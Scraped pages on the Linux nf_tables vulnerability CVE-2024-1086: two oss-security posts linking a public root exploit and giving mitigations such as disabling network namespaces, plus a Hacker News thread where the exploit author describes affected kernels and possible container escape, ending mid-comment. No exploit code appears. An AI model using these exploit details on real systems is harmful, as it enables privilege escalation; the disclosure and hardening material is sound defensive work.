>
> Introduced in February 2014:
>
> <https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=e0abdadcc6e1>
>
> Fixed in January 2024:
>
> <https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f342de4e2f33e0e39165d8639387aa6c19dff660>
>
> This is old news, but it's still relevant.  Out of major distros,
> notably RHEL 9.3 (and most rebuilds) is still not fixed, and Notselwyn's
> exploit that just works all the way to a root shell was recently widely
> publicized:
>
> <https://github.com/Notselwyn/CVE-2024-1086>
>
> There are known mitigations: blacklist the nf_tables kernel module if
> unused, disallow access to user namespaces if containers are not used,
> load Jonathan Wright's unofficial AlmaLinux kpatch (link below), or/and
> load LKRG (kills the published exploit at its last stage, leaving the
> system unstable).
>
> <https://jonathanspw.com/posts/2024-03-31-dealing-with-cve-2024-1086/>
>
> $ sha256sum AlmaLinux-9--5-14-0-362--CVE-2024-1086-Patch.ko
> 446a2f0a78f92a5530c45d443680171536888c4e6f6a3edaff95a412ca1aafbe
> AlmaLinux-9--5-14-0-362--CVE-2024-1086-Patch.ko
>
> The above exploit's author Notselwyn also wrote an extensive blog post
> on March 26:
>
> <https://pwning.tech/nftables/>
>
> Its title and abstract are:
>
> "Flipping Pages: An analysis of a new Linux vulnerability in nf_tables
> and hardened exploitation techniques
>
> A tale about exploiting KernelCTF Mitigation, Debian, and Ubuntu
> instances with a double-free in nf_tables in the Linux kernel, using
> novel techniques like Dirty Pagedirectory. All without even having to
> recompile the exploit for different kernel targets once."
>
> I asked and was hoping Notselwyn would bring this to oss-security
> directly, but since that's not happening I am posting this relatively
> brief message now.  I understand it'd be a lot of work to process the
> whole blog post into a plain text message.
>
> Another reason for me to post this is that a somewhat obscure public
> GitHub repo link (0 forks, 0 stars) for a different reproducer (crashing
> the kernel) for what turned out to be the same bug was brought to
> linux-distros (and wrongly also to distros) on March 29 (asking for a
> CVE assignment).  By linux-distros policy we need to have the underlying
> vulnerability, once it's public, brought up on oss-security.
>
> As the reporter wouldn't communicate with linux-distros any further, we
> ended up directly bringing this to s@k.o and found out the reporter did
> also bring the issue to there.  What happened next highlighted what may
> be a gap in report handling by s@....  Due to the reproducer being on a
> public GitHub repo, s@k.o merely redirected the reporter to take it to
> the normal developer mailing lists.  Which the reporter neglected to do.
> When a "public" issue enters this state, it's apparently not tracked by
> s@k.o anymore.  So if it were not for linux-distros, I think the report
> would just fall through the cracks and remain uninvestigated.  Which
> means if the bug were not already fixed, it'd remain unfixed until maybe
> rediscovered.  Via linux-distros, we pinged s@k.o further, and Greg got
> the Netfilter maintainers involved, who determined it's the fixed bug
> above.  Luckily, this did not matter (the bug is already known and fixed
> anyway), but for some other bug it could.
>
> Incidentally, that reporter in question is the same person accused of
> exploit plagiarism in the other Linux kernel oss-security posting today.
> So you can find their reproducer by following links from there to their
> other repo.  I don't want to directly promote it here (no need given the
> real exploit is so public, plus s@k.o previously expressed they dislike
> publication of reproducers), but perhaps it's somewhat more visible now.
>
> Alexander
>

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.openwall.com_10dbb769_20250111_070330.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](../../../2024/04/13/2) [[next>]](../../../2024/04/15/1) [[thread-next>]](../../../2024/04/15/2) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20240414190855.GA12716@openwall.com>
Date: Sun, 14 Apr 2024 21:08:55 +0200
From: Solar Designer <solar@...nwall.com>
To: oss-security@...ts.openwall.com
Subject: Linux: Disabling network namespaces

Hi,

Many Linux kernel vulnerabilities including the recently exploited
Netfilter CVE-2024-1086 require CAP_NET_ADMIN in a namespace, yet a
typically recommended mitigation is to disable user namespaces (not just
network namespaces).

Further, while on Debian/Ubuntu it is possible to disable just
unprivileged user namespaces with the Debian-specific sysctl
kernel.unprivileged_userns_clone=0, on other distros we'd have to use
user.max_user_namespaces=0, which (unnecessarily) prevents starting of
containers even by root.

Fredrik Nystrom on Rocky Linux Mattermost channel Security pointed out
that it is reasonable to disable just network namespaces with
user.max_net_namespaces=0 instead, and that the negative effects of
doing so and how to cope with them are well-documented for Apptainer,
with its documentation also covering Docker, Podman, and systemd:

<https://apptainer.org/docs/admin/latest/user_namespace.html#disabling-network-namespaces>

I hope some of us in here find this useful, and maybe we (including
distros) will start recommending this milder mitigation when sufficient.

I include this section of the Apptainer documentation below, as taken
from its source at
<https://github.com/apptainer/apptainer-admindocs/blob/main/user_namespace.rst>

---
******************************
 Disabling network namespaces
******************************

There have been many Linux kernel exploits that have made use of
unprivileged user namespaces as a point of entry, but almost all of them
in the last few years have been in combination with network namespaces.
Therefore even though the Apptainer project recommends enabling
unprivileged user namespaces, it recommends disabling network namespaces
when possible in order to substantially reduce the risk profile
and need for urgent updates when vulnerabilities are announced.

Network namespaces can be disabled on most Linux-based systems
like this:

.. code:: bash

   echo "user.max_net_namespaces = 0" \
        >/etc/sysctl.d/90-max_net_namespaces.conf
   sysctl -p /etc/sysctl.d/90-max_net_namespaces.conf

Apptainer does not by default make use of network namespaces, but it
does have some little-used privileged options beginning with ``--net``
that do.
Those options will not work when network namespaces are disabled.
Unfortunately it is not possible to disable only unprivileged
network namespaces, so this will affect programs that use them
even if run as root.

Some other container runtimes such as Docker and Podman do make use
of network namespaces by default.
Those two runtimes can still work when network namespaces are disabled
by adding the ``--net=host`` option.

Disabling network namespaces also blocks the systemd PrivateNetwork
feature.
To find services that use it, look for ``PrivateNetwork=true``
or ``PrivateNetwork=yes`` in ``/lib/systemd/system/*.service``.
This can be turned off for each service through a
``/etc/systemd/system/<service>.d/*.conf`` file, for example for
``systemd-hostnamed``:

.. code:: bash

   cd /etc/systemd/system
   mkdir -p systemd-hostnamed.service.d
   (echo "[Service]"; echo "PrivateNetwork=no") \
        >systemd-hostnamed.service.d/no-private-network.conf

If the service is enabled (that is, actively used) then restart it
and check its status:

.. code:: bash

   systemctl status systemd-hostnamed
   systemctl daemon-reload
   systemctl restart systemd-hostnamed
   systemctl status systemd-hostnamed
---

Alexander

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from news.ycombinator.com_8822508c_20250111_070334.html ===


| |  | **[Hacker News](news)** [new](newest) | [past](front) | [comments](newcomments) | <ask> | <show> | <jobs> | <submit> | [login](login?goto=item%3Fid%3D39828424) | | --- | --- | --- | |
| --- | --- | --- | --- |
|
| |  |  | [Flipping Pages: New Linux vulnerability in nf\_tables and exploitation techniques](https://pwning.tech/nftables/) ([pwning.tech](from?site=pwning.tech)) | | --- | --- | --- | |  | | 406 points by [Unroll0201](user?id=Unroll0201) [9 months ago](item?id=39828424)  | [hide](hide?id=39828424&goto=item%3Fid%3D39828424) | [past](https://hn.algolia.com/?query=Flipping%20Pages%3A%20New%20Linux%20vulnerability%20in%20nf_tables%20and%20exploitation%20techniques&type=story&dateRange=all&sort=byDate&storyText=false&prefix&page=0) | [favorite](fave?id=39828424&auth=b5c5b7059706fdd21242847642bd1e0709c90928) | [120 comments](item?id=39828424) |  | |  |  | [Unroll0201](user?id=Unroll0201) [9 months ago](item?id=39828425)   | [next](#39830665) [–]  Today I published a proof-of-concept exploit for CVE-2024-1086, working on Debian and Ubuntu among others. The affected exploit versions are from Linux kernel v5.14 up to v6.6. The support for v6.4 to v6.6 is depending on the `CONFIG\_INIT\_ON\_ALLOC\_DEFAULT\_ON` kernel config variable, but please check README.md for this info. The bug was patched in February 2024, and has been labelled CVE-2024-1086. Make sure to update your Linux devices! | | --- | --- | --- | | | --- | --- | --- | --- | | |  |  | [dev\_snd](user?id=dev_snd) [9 months ago](item?id=39829046)   | [parent](#39828425) | [next](#39828930) [–]  Great work and great write-up! I especially love the MAINFRAME BREACH PROTOCOL that comes with it. | | --- | --- | --- | | | |  |  | [junon](user?id=junon) [9 months ago](item?id=39828930)   | [parent](#39828425) | [prev](#39829046) | [next](#39831442) [–]  Haha. Nice sources. And nice work, curious what the larger response to this will be. [https://github.com/Notselwyn/CVE-2024-1086/blob/main/src/mai...](https://github.com/Notselwyn/CVE-2024-1086/blob/main/src/main.c#L197) | | --- | --- | --- | | | |  |  | [rfoo](user?id=rfoo) [9 months ago](item?id=39831442)   | [parent](#39828425) | [prev](#39828930) | [next](#39829042) [–]  Good job writing this up! Quick question: for "post"-exploitation, once you had a KSMA-like primitive why would you choose to still do the modprobe\_path dance, and introduce a pid bruteforce for fileless :(, instead of e.g. patching kernel .text with a short shellcode to become root & break out of namespaces? | | --- | --- | --- | | | |  |  | [Unroll0201](user?id=Unroll0201) [9 months ago](item?id=39897088)   | [root](#39828425) | [parent](#39831442) | [next](#39829042) [–]  I'm a bit late, but it's because I wanted my exploit to be universal. When patching kernel .text I'd need know: - know the offset to the patched instructions (memory scanning will not work) - know the architecture-compatible instructions to replace it with | | --- | --- | --- | | | |  |  | [greggsy](user?id=greggsy) [9 months ago](item?id=39829042)   | [parent](#39828425) | [prev](#39831442) | [next](#39829353) [–]  What are some potential attack vectors and impacts for this one? | | --- | --- | --- | | | |  |  | [Unroll0201](user?id=Unroll0201) [9 months ago](item?id=39829188)   | [root](#39828425) | [parent](#39829042) | [next](#39829238) [–]  The attack vectors are pretty much the same for other Linux kernel LPE exploits. The impact is also much alike: privilege escalation from unprivileged user to root user. Should be noted that the exploit can read/write any physical memory on the device, but uses it to become root user. An important note is that the exploit requires nf\_tables to be present, and unprivileged user namespaces. This can be checked with commands specified in the README.md file in the repo. Notice however that the exploit contains a namespace escape, allowing it to break out of namespaces on vulnerable kernels. As said in the other comment, this possibly includes LXC containers and privileged Docker containers, but this is not tested and is purely an educated guess). The namespace escape is included because it is a requirement for the KernelCTF program. | | --- | --- | --- | | | |  |  | [MrStonedOne](user?id=MrStonedOne) [9 months ago](item?id=39829238)   | [root](#39828425) | [parent](#39829042) | [prev](#39829188) | [next](#39829353) [–]  Attack vector requires local execution access and allows for escaping limited privileges like non-root user accounts and breaking out of (some?) namespace jails used by containers and sandboxing systems. | | --- | --- | --- | | | |  |  | [yjftsjthsd-h](user?id=yjftsjthsd-h) [9 months ago](item?id=39829353)   | [parent](#39828425) | [prev](#39829042) | [next](#39829924) [–]  > The affected exploit versions are from Linux kernel v5.14 up to v6.4. Linked page says > The exploit affects versions from (including) v5.14 to (including) v6.6, excluding patched branches v5.15.149>, v6.1.76>, v6.6.15>. ? | | --- | --- | --- | | | |  |  | [Unroll0201](user?id=Unroll0201) [9 months ago](item?id=39829416)   | [root](#39828425) | [parent](#39829353) | [next](#39829924) [–]  The exploit support from v6.4 - v6.6 is depending on a Linux kernel kconfig value. If `CONFIG\_INIT\_ON\_ALLOC\_DEFAULT\_ON` is set to `y`, the exploit is not working. If it is set to `n`, it does work. I have updated my comment. | | --- | --- | --- | | | |  |  | [cedws](user?id=cedws) [9 months ago](item?id=39829924)   | [parent](#39828425) | [prev](#39829353) | [next](#39863612) [–]  Can I ask why you decided to disclose this exploit rather than sell it to a company like Zerodium? Is it a matter of ethics, or is the money not worth it for you? | | --- | --- | --- | | | |  |  | [Unroll0201](user?id=Unroll0201) [9 months ago](item?id=39830879)   | [root](#39828425) | [parent](#39829924) | [next](#39830185) [–]  For me it is about the ethics among other things. I do not know to which goverments Zerodium is selling, much like any other zeroday broker. Additionally, I wouldn't be surprised if selling to Zerodium is illegal to begin with. By taking the KernelCTF approach I get my bounty, I don't get into legal trouble, and I get to contribute to the Linux kernel VR community which means a lot to me | | --- | --- | --- | | | |  |  | [ok\_dad](user?id=ok_dad) [9 months ago](item?id=39834008)   | [root](#39828425) | [parent](#39830879) | [next](#39837609) [–]  Thank you for having morals and giving this away to the community. Governments already have enough power that they don’t need more. I respect this very much, it’s hard to find people on hacker news who aren’t dyed in the wool capitalists. | | --- | --- | --- | | | |  |  | [Shocka1](user?id=Shocka1) [9 months ago](item?id=39863796)   | [root](#39828425) | [parent](#39834008) | [next](#39837609) [–]  There is a diverse mix here and always has been - it's one of the best things about this place. Rolling up a statement to apply to a whole group of people is defined as stereotyping and not the highest version of critical thought. To state all Capitalists on HN would sell a CVE to the highest bidder is just as ridiculous as saying a Communist/Libertarian/Socialist would. | | --- | --- | --- | | | |  |  | [buggeryorkshire](user?id=buggeryorkshire) [9 months ago](item?id=39837609)   | [root](#39828425) | [parent](#39830879) | [prev](#39834008) | [next](#39830185) [–]  Thank you, appreciated. | | --- | --- | --- | | | |  |  | [junaru](user?id=junaru) [9 months ago](item?id=39830185)   | [root](#39828425) | [parent](#39829924) | [prev](#39830879) | [next](#39831705) [–]  > Zerodium customers are government institutions (mainly from Europe and North America) in need of advanced zero-day exploits and cybersecurity capabilities. How does this even openly exist in post Stuxnet world? If this is not clear evidence of government working with criminals i don't know what is. | | --- | --- | --- | | | |  |  | [londons\_explore](user?id=londons_explore) [9 months ago](item?id=39832154)   | [root](#39828425) | [parent](#39830185) | [next](#39830221) [–]  Governments only *say* they don't work with criminals. | | --- | --- | --- | | | |  |  | [okasaki](user?id=okasaki) [9 months ago](item?id=39835926)   | [root](#39828425) | [parent](#39832154) | [next](#39833147) [–]  Or the company is lying. It's not like anyone can check. | | --- | --- | --- | | | |  |  | [redundantly](user?id=redundantly) [9 months ago](item?id=39833147)   | [root](#39828425) | [parent](#39832154) | [prev](#39835926) | [next](#39830221) [–]  Government officials are often criminals themselves. | | --- | --- | --- | | | |  |  | [streb-lo](user?id=streb-lo) [9 months ago](item?id=39830221)   | [root](#39828425) | [parent](#39830185) | [prev](#39832154) | [next](#39831705) [–]  >clear evidence evidence is not what someone writes on their landing page | | --- | --- | --- | | | |  |  | [caskstrength](user?id=caskstrength) [9 months ago](item?id=39831705)   | [root](#39828425) | [parent](#39829924) | [prev](#39830185) | [next](#39863612) [–]  You are being downvoted, but as an outside observer I have also always been interested in ethics of security research. | | --- | --- | --- | | | |  |  | [nineteen20](user?id=nineteen20) [9 months ago](item?id=39863612)   | [parent](#39828425) | [prev](#39829924) | [next](#39828917) [–]  Congratulations! How did you spot the bug? As official Syzkaller has missed these lines of nf\_tables. | | --- | --- | --- | | | |  |  | [Unroll0201](user?id=Unroll0201) [9 months ago](item?id=39897115)   | [root](#39828425) | [parent](#39863612) | [next](#39828917) [–]  Manual auditing ;-) I have specified it in <https://pwning.tech/nftables#31-finding-the-bug> | | --- | --- | --- | | | |  |  | [derelicta](user?id=derelicta) [9 months ago](item?id=39828917)   | [parent](#39828425) | [prev](#39863612) | [next](#39828916) [–]  Congrats! Impressive work! | | --- | --- | --- | | | |  |  | [pelagicAustral](user?id=pelagicAustral) [9 months ago](item?id=39828916)   | [parent](#39828425) | [prev](#39828917) | [next](#39830665) [–]  Awwww Fuck me! that's my lazy afternoon gone now | | --- | --- | --- | | | |  |  | [eikenberry](user?id=eikenberry) [9 months ago](item?id=39829660)   | [root](#39828425) | [parent](#39828916) | [next](#39829089) [–]  Fixed kernel was released to Debian stable well over a month ago (my logs have it installed on 2/12). So unless you ignore kernel security updates you should already be covered. | | --- | --- | --- | | | |  |  | [blincoln](user?id=blincoln) [9 months ago](item?id=39835525)   | [root](#39828425) | [parent](#39829660) | [next](#39829089) [–]  Unfortunately, this was almost the same time that the Debian devs also pushed the ill-conceived Nvidia-driver-breaking kernel patch, so I wouldn't be surprised if a lot of people had disabled kernel updates. | | --- | --- | --- | | | |  |  | [richardwhiuk](user?id=richardwhiuk) [9 months ago](item?id=39829089)   | [root](#39828425) | [parent](#39828916) | [prev](#39829660) | [next](#39830665) [–]  This is local privilege escalation only right? | | --- | --- | --- | | | |  |  | [Unroll0201](user?id=Unroll0201) [9 months ago](item?id=39829154)   | [root](#39828425) | [parent](#39829089) | [next](#39830665) [–]  Correct, but it is definitively worth updating for on high-profile systems. I have not tested it, but because I have included the namespace escape in the exploit for KernelCTF, it may be able to break out of LXC containers and privileged Docker containers running on vulnerable Linux kernels. | | --- | --- | --- | | | |  |  | [dathinab](user?id=dathinab) [9 months ago](item?id=39829691)   | [root](#39828425) | [parent](#39829154) | [next](#39830665) [–]  if it works for LXC containers shouldn't it also work for unprivileged (but non VM) docker containers? | | --- | --- | --- | | | |  |  | [Unroll0201](user?id=Unroll0201) [9 months ago](item?id=39830843)   | [root](#39828425) | [parent](#39829691) | [next](#39830665) [–]  This is an educated guess, but I believe unprivileged Docker containers cannot create (user) namespaces. Hence, the vulnerability cannot be triggered, since the exploit requires interaction with nf\_tables, which requires (namespace) root. LXC containers and privileged Docker containers allow these namespaces to be made inside of them, whilst unprivileged Docker containers do not. | | --- | --- | --- | | | |  |  | [bakkoting](user?id=bakkoting) [9 months ago](item?id=39830665)   | [prev](#39828425) | [next](#39830363) [–]  From the patch [1]: > This reverts commit e0abdadcc6e1. [...] Its not clear to me why this commit was made. Anyone dug up the history here? [1] [https://lore.kernel.org/all/20240120215012.129529-1-fw@strle...](https://lore.kernel.org/all/20240120215012.129529-1-fw%40strlen.de/) | | --- | --- | --- | | | |  |  | [aseipp](user?id=aseipp) [9 months ago](item?id=39833630)   | [parent](#39830665) | [next](#39831866) [–]  The original commit is over 10 years old now, so it's probably lost to the sands of time. I did some looking but couldn't find anything on the old netdev lists. Maybe the patch was sent directly to Pablo Neira Ayuso, the committer. It was part of a series so it's not like it was a one-off patch. In a strange twist of fate, the original author was Patrick McHardy who is now a persona non grata. Unless Pablo can remember or dig it from his emails, it probably won't ever be clear exactly what the use case was, at least not through basic investigation. | | --- | --- | --- | | | |  |  | [tg180](user?id=tg180) [9 months ago](item?id=39831866)   | [parent](#39830665) | [prev](#39833630) | [next](#39830363) [–]  [https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/lin...](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=e0abdadcc6e1) > netfilter: nf\_tables: accept QUEUE/DROP verdict parameters > Allow userspace to specify the queue number or the errno code for QUEUE and DROP verdicts. | | --- | --- | --- | | | |  |  | [loeg](user?id=loeg) [9 months ago](item?id=39831991)   | [root](#39830665) | [parent](#39831866) | [next](#39830363) [–]  Yeah, but *why?* | | --- | --- | --- | | | |  |  | [rokkitmensch](user?id=rokkitmensch) [9 months ago](item?id=39832586)   | [root](#39830665) | [parent](#39831991) | [next](#39830363) [–]  If one has to ask, it's a Five Eyes plant. | | --- | --- | --- | | | |  |  | [aseipp](user?id=aseipp) [9 months ago](item?id=39833652)   | [root](#39830665) | [parent](#39832586) | [next](#39830363) [–]  Hardly. This is just a typical double free vulnerability, AKA a normal Tuesday in the C/C++ world, and which people have been exploiting in the kernel (with its complex object lifetimes and semantics) for well over 10 years now. There's no need to "plant" anything to find these. | | --- | --- | --- | | | |  |  | [rokkitmensch](user?id=rokkitmensch) [9 months ago](item?id=39856281)   | [root](#39830665) | [parent](#39833652) | [next](#39830363) [–]  Which makes it a fine cover! | | --- | --- | --- | | | |  |  | [freedomben](user?id=freedomben) [9 months ago](item?id=39830363)   | [prev](#39830665) | [next](#39829348) [–]  This is an extremely impressive write-up. When writing security blog posts, there's always a constant battle of essentially "how much background/prerequisite knowledge do I assume," and getting the balance right to make it accessible but also feasible to write can be very challenging. Identifying your target market up front, and then delivering to that market with plenty of background info, is no easy feat! Well done! I'm bookmarking this to give to aspiring researchers, of whom I meet a few every year who are looking for guidance like this. | | --- | --- | --- | | | |  |  | [Unroll0201](user?id=Unroll0201) [9 months ago](item?id=39833394)   | [parent](#39830363) | [next](#39829348) [–]  Thank you so much! It feels great to hear this. | | --- | --- | --- | | | |  |  | [loudmax](user?id=loudmax) [9 months ago](item?id=39829348)   | [prev](#39830363) | [next](#39829396) [–]  This exploit relies on unprivileged access to user namespaces: `sysctl kernel.unprivileged\_userns\_clone = 1` This is the default setting for Debian/Ubuntu, and also Arch Linux kernels. If you don't have a need for that setting, (eg. running Docker commands without sudo), you should probably disable that anyway. | | --- | --- | --- | | | |  |  | [dathinab](user?id=dathinab) [9 months ago](item?id=39829748)   | [parent](#39829348) | [next](#39829369) [–]  It's not just used by docker/packman. But also e.g. by the chrome sandbox used by e.g. electron apps (or e.g. 1password). Through that sandbox helper binary can also work with being a suid program. I also wouldn't be too surprised if e.g. proton will start using user namspaces at some point in the future. So for any non-hardened desktop linux system you probably should \_not\_ disable it! (For many servers or special hardened Linux it often isn't a bad idea to disable it.) | | --- | --- | --- | | | |  |  | [yjftsjthsd-h](user?id=yjftsjthsd-h) [9 months ago](item?id=39829369)   | [parent](#39829348) | [prev](#39829748) | [next](#39836568) [–]  :\ It really is unfortunate that that setting is *great* for letting people run containers (and the like) without giving them root access... but also has a bad track record of then having vulnerabilities that allow root access. | | --- | --- | --- | | | |  |  | [dathinab](user?id=dathinab) [9 months ago](item?id=39829784)   | [root](#39829348) | [parent](#39829369) | [next](#39836568) [–]  IMHO it is just too complicated/flexible designed. | | --- | --- | --- | | | |  |  | [yjftsjthsd-h](user?id=yjftsjthsd-h) [9 months ago](item?id=39830626)   | [root](#39829348) | [parent](#39829784) | [next](#39836568) [–]  I'm not a kernel developer so take with a grain of salt; what I've *heard* suggested is that it's not fundamentally bad and if we'd had it from day one it would be fine, but a lot of kernel interfaces were designed with the idea that only root could use them so they didn't worry about certain security matters as much. And maybe that was never *ideal* but it could even be reasonable; if only root can trigger a bug that gives you root access... it's not good because it could be used to work around other restrictions, but one can imagine that it wouldn't exactly be a priority. But then what actually happened is that very late in the game we got this new feature that allows any old user to access these less-protected interfaces, and that's resulted in a certain amount of... catching up. | | --- | --- | --- | | | |  |  | [1oooqooq](user?id=1oooqooq) [9 months ago](item?id=39836568)   | [parent](#39829348) | [prev](#39829369) | [next](#39832707) [–]  the real problem is not that. this is nothing but a way to DROP privilege! the problem is that containers require tons of hacks on the network side to just-work. and docker main selling point is all the usafe hacks it does for it. so obviously, any container solution will adopt these hacks eventually, and there is the problem. you end up with a perfectly sane namespace functionality that removes access, but then the kernel opens the gate because network hacks are good | | --- | --- | --- | | | |  |  | [GoblinSlayer](user?id=GoblinSlayer) [9 months ago](item?id=39837982)   | [root](#39829348) | [parent](#39836568) | [next](#39832707) [–]  AIU the cause is Netfilter API that doesn't sanitize its input, because only root can call it, so there is no need to sanitize. Then unprivileged user namespaces open all root API to unprivileged user, so nonsanitizing Netfilter API became available to unprivileged user. | | --- | --- | --- | | | |  |  | [1oooqooq](user?id=1oooqooq) [9 months ago](item?id=39848944)   | [root](#39829348) | [parent](#39837982) | [next](#39832707) [–]  that's my point. why from a point users didn't have access to netfiltet now gives users access to netfilter? from a command which should be adding more restraint no less. also people focus on this only being a problem now with priv escalation... but all that was always a problem before unprivileged containers... by allowing container code to exploit host kernel code, but nobody called it a privilege escalation then because you started your container as root. sigh. | | --- | --- | --- | | | |  |  | [aidenn0](user?id=aidenn0) [9 months ago](item?id=39832707)   | [parent](#39829348) | [prev](#39836568) | [next](#39829396) [–]  6.1.65 and that option doesn't exist. Did it get renamed? | | --- | --- | --- | | | |  |  | [Unroll0201](user?id=Unroll0201) [9 months ago](item?id=39833390)   | [root](#39829348) | [parent](#39832707) | [next](#39833510) [–]  The sysctl command isn't available on specific kernel configurations. You could try running `unshare -Urn`. If it runs without sudo (and you haven't configured any specific permissions yourself), unprivileged namespaces are enabled. | | --- | --- | --- | | | |  |  | [bjackman](user?id=bjackman) [9 months ago](item?id=39833510)   | [root](#39829348) | [parent](#39832707) | [prev](#39833390) | [next](#39829396) [–]  I don't think it's in the upstream kernel - various distros carry it as a patch. Maybe yours doesn't? | | --- | --- | --- | | | |  |  | [tryauuum](user?id=tryauuum) [9 months ago](item?id=39829396)   | [prev](#39829348) | [next](#39829290) [–]  why are unprivilged user namespaces enabled by default? why by default give user the ability to run iptables and other stuff (mount?) (even though it runs in an "unprivilged" namespace) | | --- | --- | --- | | | |  |  | [kentonv](user?id=kentonv) [9 months ago](item?id=39829590)   | [parent](#39829396) | [next](#39829430) [–]  Unprivileged user namespaces make it possible for unprivileged programs to set up sandboxes. For example, Chrome uses namespaces to implement its process sandbox. However, Chrome installs a setuid-root binary, so that it doesn't need "unpriveleged" namespaces enabled. This is sad, though: setuid-root binaries are inherently a security risk of their own. It would be nice if Chrome did not need to install a suid-root binary. But, it can only possibly avoid this in the future if unprivileged user namespaces are widely available. Bugs like this unfortunately delay that future. Incidentally, programs like Chrome that set up namespace-based sandbox also commonly use seccomp to prevent the sandboxed code from using exotic kernel features -- including namespaces. So user namespaces won't be available to sandboxed code regardless of whether you enable unprivileged user namespaces at the system level. Personally I feel that on a single-user desktop, there's little point in enforcing a separation between users and root -- everything interesting is probably available to your user account anyway. But sandboxes like Chrome's are obviously essential to security on desktops. So I'd tend to say, on a single-user desktop, enabling unprivileged user namespaces improves security overall, by encouraging the use of sandboxes. Multi-user systems are a different story, obviously. | | --- | --- | --- | | | |  |  | [dathinab](user?id=dathinab) [9 months ago](item?id=39829931)   | [root](#39829396) | [parent](#39829590) | [next](#39830690) [–]  Chromes sandbox uses unprivileged namespaces but has a suid-root fallback. Electron apps too (if sandboxing is enabled). Bubblewrap (used by flatpack, idk. about snap) prefers user namespaces, too. All of them could can have suid fallbacks they would prefer to not have. Tbh. if Linux had a proper capability system it probably would make sense to attach a "user ns" capability to binaries which in the past used suid-root for namespaces and not allow "other" processes to use it. > there's little point in enforcing a separation between users and root I don't agree. But it is a different discussion. (And a complicated discussion too as Linux desktop is IMHO currently lacking in various security areas as security requirements have changed. So often when you argue they should do this you get non productive answers like "oh but you also could do [that other think which also need to change sooner or later]". Anyway it can make the difference between it being easily able to steal all password from your password manager and it only being able to steal the passwords you did use since infection. Or it being able to steel a early boot full disk encryption key. etc. etc.) | | --- | --- | --- | | | |  |  | [IshKebab](user?id=IshKebab) [9 months ago](item?id=39830690)   | [root](#39829396) | [parent](#39829590) | [prev](#39829931) | [next](#39830942) [–]  > there's little point in enforcing a separation between users and root I agree but I don't think that's fundamental. It's pointless on Linux because any attacker can simply alias `sudo` to something and wait. But I can imagine a modern desktop OS where there's a useful admin account. Windows is pretty close. Much better than Linux on that front. | | --- | --- | --- | | | |  |  | [kentonv](user?id=kentonv) [9 months ago](item?id=39831918)   | [root](#39829396) | [parent](#39830690) | [next](#39830838) [–]  Yes, I agree. But I don't think the path forward is to re-establish the security of root. Instead the path forward is to stop granting the full capabilities of the user to every program the user runs. In Android, for example, every app has its own user account. That is meaningful! I wish every desktop app were sandboxed by default, but it requires redesigning so many interfaces that you might as well think of it as a whole new platform. Of course, such a platform basically exists: the web platform. I think everything-is-a-web-site is the realistic way we get to secure desktops. I don't like it but it's hard to imagine anything else getting traction from here. | | --- | --- | --- | | | |  |  | [ChocolateGod](user?id=ChocolateGod) [9 months ago](item?id=39830838)   | [root](#39829396) | [parent](#39830690) | [prev](#39831918) | [next](#39830942) [–]  Even on a Linux desktop OS with a single user, it's still a security risk as it skips over a last line of defence. If a Chrome bug is found that allows web pages to arbitrary code execution, it can be chained with an exploit like this to infect more than just the user account, potentially, depending on the computer, the firmware itself. | | --- | --- | --- | | | |  |  | [IshKebab](user?id=IshKebab) [9 months ago](item?id=39833687)   | [root](#39829396) | [parent](#39830838) | [next](#39830942) [–]  Sure but most malware doesn't really care about infecting more than the user. The only reason to infect firmware is to gain persistence in the face of OS reinstalls, but those are very rare in general. Only targeted NSA level malware is going to bother with that. For normal botnet/cryptocurrency stealing malware once it has user access it has everything it needs. | | --- | --- | --- | | | |  |  | [Manouchehri](user?id=Manouchehri) [9 months 